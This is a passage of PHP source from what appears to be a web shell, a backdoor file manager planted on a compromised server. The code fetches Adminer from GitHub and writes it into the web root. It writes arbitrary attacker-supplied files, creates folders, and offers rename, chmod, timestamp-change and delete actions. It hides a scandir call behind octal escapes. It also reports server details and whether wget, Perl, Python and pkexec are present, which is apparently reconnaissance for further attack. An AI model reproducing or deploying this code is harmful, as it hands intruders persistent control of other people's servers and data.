    $check = $serlok."/".$_POST['miner'];
    $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web."",$check);
    $content = crot('https://github.com/gggeek/db-3v4l/raw/refs/heads/master/adminer/adminer/adminer.php');
    $open = fopen($check, 'w');
    fwrite($open, $content);
    fclose($open);
    if (file_exists($check)) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Adminer<font color='lime'> : $check </font><br>Link : <a href='".$result."' target='_blank'><i>$result</i></a></td></table>";
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create adminer..!!</center></font></td></table>";
                    }
                }
        }exit();
} elseif ($_REQUEST[net('buatfile')] == "opet") {
    function createfile(){
        $pat = $_GET['path'];
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$pat/$nama_file", 'w');
        $files = $_GET['path']."/".$nama_file;
        $asu = str_replace($_SERVER['DOCUMENT_ROOT'], $web. "", $files);
        if (fwrite($handle, $isi_file)) {
            echo '<table class="directory-listing-table" style="border-color:lime;"><td>Created =>&nbsp;<font color="lime">'.$pat.'/'.$nama_file.'<br></font>Link : <a href="'.$asu.'" target="_blank"><font color="aqua"><i>Click here</i></a></font></td></table>';
        } else {
            echo '<table class="directory-listing-table" style="border-color:red;"><td><font color=red><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to create file..!!</font></script></td></table>';
        }
    } if(!isset($_POST['bikin'])) {
        echo "<center><table class='directory-listing-table'><td width='12%''>
    <form method='POST'>
        <input type='text' value='file.php' placeholder='Nama File' style='width: 525px;' name='nama_file' autocomplete='off'><br><br>
        <textarea name='isi_file' rows='20' cols='100' placeholder='Hello World!'></textarea><br>
        <button type='sumbit' class='btn btn-outline-light' style='width:200px; height:36px;' height:30;' name='bikin'>CREATE</button>&nbsp;
        <a href='?path=".$serlok."' class='btn btn-outline-light'>Back</a><br>
    </form></center>";
        } else {
            createfile();
        }exit();
} elseif ($_GET[net('buatfolder')] == "opet") {
      function createDirectory() {
        if (empty($_POST['add'])) {
        echo '<table class="directory-listing-table" style="border-color:orange;"><td><font color="orange">Folder field is required</font> [<a href="?path='.$_GET['path'].'&'.net("buatfolder").'=opet"><i class="fa-solid fa-folder-plus" aria-hidden="true"></i>Create again</a>]</td></table>';
        } else {
        $add = $_POST["add"];
        $d7net = mkdir($_GET['path']."/".$add);
        if ($d7net == true) {
            echo "<table class='directory-listing-table' style='border-color:lime;'><td>Created =><font color=lime> ".$_GET['path']."/</font><font color='orange'>$add</font><br>
            <a href='?path=".$_GET['path']."/$add'><u>Click Here</u></a></td></table>";
    } else {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><font color=red><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create folder : $add</font></td></table>";
                }
        }
}
        if (!isset($_POST['submit'])) {
            echo '<table class="directory-listing-table"><td>
        <form action="" method = "POST"><h5><i class="fa fa-folder-plus"></i> Create Folder</h5><hr><center>
        <div style="width:300px;">
         <input type="text" class="form-control" placeholder="Folder Name" name="add" id="add"/><br></div>
        <button type="submit" class="btn btn-outline-light" name="submit" value="Create directory" style="width:120px;">Create</button>&nbsp;
        <a href="?path='.$serlok.'" class="btn btn-outline-light" style="width:120px;">Back</a><br><br></form></td></table>';
        } else {
            createDirectory();
        }exit();
} elseif ($_REQUEST[net('info')] == "opet") {
    echo "<table class='directory-listing-table' align='center'>
    <div id='content'><tr><td>";
    echo "Server : <font color=orang>".$_SERVER['HTTP_HOST']."</font><br>";
    echo "Server IP : <font color=orange>".ipserv()."</font> &nbsp;<br> Your IP : <font color=orange>".$_SERVER['REMOTE_ADDR']."</font><br>";
    echo "Web Server : <font color='orange'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "System : <font color='orange'>".php_uname()."</font><br>";
    echo "User : <font color='orange'>".@get_current_user()."&nbsp;</font>( <font color='orange'>".@getmyuid()."</font>)<br>";
    echo "PHP Version : <font color='orange'>".@phpversion()."&nbsp;</font>=><font color='orange'>&nbsp;".php_sapi_name()."</font><br>";
    echo "</tr></td><tr><td>Disable Function : ".$disf."</font>";
    echo "</div></tr></td><tr><td>";
    echo "<hr>Orecle : ";
if (function_exists('oci_connect')) {
        echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;| SSH2 : ";
}

if (function_exists('ssh2_connect')) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;| MySQL : ";
}
if (function_exists("mysql_connect")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
$pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
    echo " | PKEXEC : $pkexec<br><br>";
    echo "</tr></td></table><br>";
    exit();

}


if (!is_readable($serlok)) {
    die("<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :(</font></center></td></thead></table>");
}

echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 20px black;width:90%;border-left:1px solid #40BECC;border-right:1px solidrgb(255, 255, 255);border-bottom:1px solidrgb(255, 255, 255);--bs-border-radius:80rem;" align="center">
<thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;"><tr>
<th style="text-align:center;">Name</th>
<th style="text-align:center;">Size</th>
<th style="text-align:center;">Last Modified</th>
<th style="text-align:center;">Owner</th>
<th style="text-align:center;">Permissions</th>
<th style="text-align:center;">Actions</th>
</tr></thead>';
$scd = "\163\143"."\141\156\144"."\151\162";
if(is_readable($serlok)){
            $fetch=$scd($serlok);
            $serlokbos=array();
            $filez=array();
            foreach($fetch as $fols){
                if($fols=='.'||$fols=='..'){
                    continue;
                }
                    $d7nets=$serlok.'/'.$fols;
                    if(is_dir($d7nets)){
                        array_push($serlokbos,$fols);
                    }elseif(is_file($d7nets)){
                        array_push($filez,$fols);
                    }
                }
            }
foreach($serlokbos as $dir){
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #FAA625'></i> <a href=\"?path=".$serlok."/".$dir."\">".$dir."</a></td>
    <td><center>Dir</center></td>
    <td><center>".filedate($serlok."/".$dir)."</center></td>
    <td>".owner($serlok."/".$dir)."</td>
    <td><center>";
    if(is_writable($serlok."/".$dir)) echo '<font color="lime">';
    elseif(!is_readable($serlok."/".$dir)) echo '<font color="red">';
    echo statusnya($serlok."/".$dir);
    if(is_writable($serlok."/".$dir) || !is_readable($serlok."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$serlok\">
    <div class='btn-group me-2' role='group' aria-label='First group'>
    <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
    <i class='fa fa-pencil' style='color: #fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color: #06D2D5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color: #5654F5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #E53A3A'></i></button></div>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$serlok/$dir\">
    </form></center></td>
    </tr>";
}

foreach($filez as $file) {
    if(!is_file("$serlok/$file")) continue;
        $size = filesize("$serlok/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
        $size = '<font color="aqua">'.round($size/1024,2).'</font> MB';
    } else {
        $size = '<font color="#E6F01C">'.$size.'</font> KB';
    }
echo "<tr>
<td>".cekfile($serlok."/".$file)."
<a href=\"?viewfile=".$serlok."/$file&path=".$serlok."\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>".filedate($serlok."/".$file)."</center></td>
<td>".owner($serlok."/".$file)."</td>
<td><center>";
if(is_writable("$serlok/$file")) echo '<font color="lime">';
elseif(!is_readable("$serlok/$file")) echo '<font color="red">';
echo statusnya("$serlok/$file");
if(is_writable("$serlok/$file") || !is_readable("$serlok/$file")) echo '</font>';
echo "</center></td><td><center>
<form method='post' action='?pilihan&path=$serlok'>
<div class='btn-group' role='group' aria-label='First group'>";
echo gazz($file);
echo "</div><input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$serlok/$file\">
</form></center></td></tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>
</body>
</html>